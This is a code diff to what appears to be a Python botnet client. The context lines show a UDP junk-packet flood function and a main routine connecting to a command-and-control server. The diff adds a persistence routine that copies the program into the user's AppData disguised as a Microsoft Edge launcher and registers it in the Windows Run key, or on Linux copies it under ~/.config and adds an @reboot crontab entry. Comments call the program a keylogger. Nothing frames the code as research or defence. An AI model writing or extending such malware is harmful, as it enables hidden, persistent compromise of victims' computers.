@@ -392,6 +392,29 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
         print('Junk Packet Sent')
 
+def setup_persistence():
+    """This function sets up persistence (runs automatically at startup) of this executable.
+    On Linux, it uses crontab to create a cron job that runs this script at reboot.
+    On Windows, it uses the Windows Registry to add a key that runs this script at startup.
+    Note that this will only work if the script is bundled as an executable using PyInstaller on Windows.
+    On Linux, it will work with the script itself or the executable."""
+    os_type = platform.system()
+    if os_type == "Windows":
+        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+        if not os.path.exists(location):
+            shutil.copyfile(executable, location)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    elif os_type == "Linux":
+        location = os.path.expanduser('~') + "/.config/KaliStartup"
+        if not os.path.exists(location):
+            # Create the autostart directory if it doesn't exist
+            os.makedirs(location)
+            filename = os.path.join(location, "KaliStartup")
+            # Copy the keylogger to that new location
+            shutil.copyfile(sys.executable, filename)
+            # Add the keylogger to startup via crontab
+            crontab_line = f"@reboot {filename}"
+            os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
@@ -595,5 +618,6 @@ def main():
 if __name__ == '__main__':
         try:
             main()
+            setup_persistence()
         except:
             pass
